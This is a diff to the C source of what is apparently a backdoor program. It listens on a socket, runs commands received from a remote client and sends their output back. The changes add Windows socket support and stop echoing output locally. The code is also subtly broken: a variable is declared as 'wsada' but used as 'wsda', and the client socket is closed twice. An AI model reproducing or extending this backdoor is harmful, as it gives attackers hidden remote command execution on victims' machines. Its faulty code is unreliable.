@@ -1,7 +1,13 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <unistd.h>
 
 #include "backdoor.h"
+
+#ifdef WIN32
+    #include <windows.h>
+    #include <winsock.h>
+#endif
 
 int main(int argc, char *argv[]){
 
@@ -16,6 +22,10 @@ int main(int argc, char *argv[]){
 
     show_banner();
 
+    #ifdef WIN32
+        WSADATA wsada;
+    #endif
+
     struct sockaddr_in backdoor;
     struct sockaddr_in client;
 
@@ -23,6 +33,10 @@ int main(int argc, char *argv[]){
     int size = sizeof(struct sockaddr_in);
 
     char cmd[1024];
+
+    #ifdef WIN32
+        WSAStartup(0x0101, &wsda);
+    #endif
 
     int sockfd_server = create_socket();
     int sockfd_client = create_socket();
@@ -70,12 +84,23 @@ int main(int argc, char *argv[]){
         char output[1024];
 
         memset(&output, 0, sizeof(output));
-
+        
         while(fgets(output, sizeof(output), exec) != 0){
-            printf("%s", output);
+            //printf("%s", output);
             send(sockfd_client, output, sizeof(output), 0);
         }
+
+//       execvp(cmd, NULL);
+        pclose(exec);
     }
+
+
+    #ifdef WIN32
+        WSACleanup();
+    #endif
+
+    close(sockfd_client);
+    close(sockfd_client);
 
     return 0;
 }
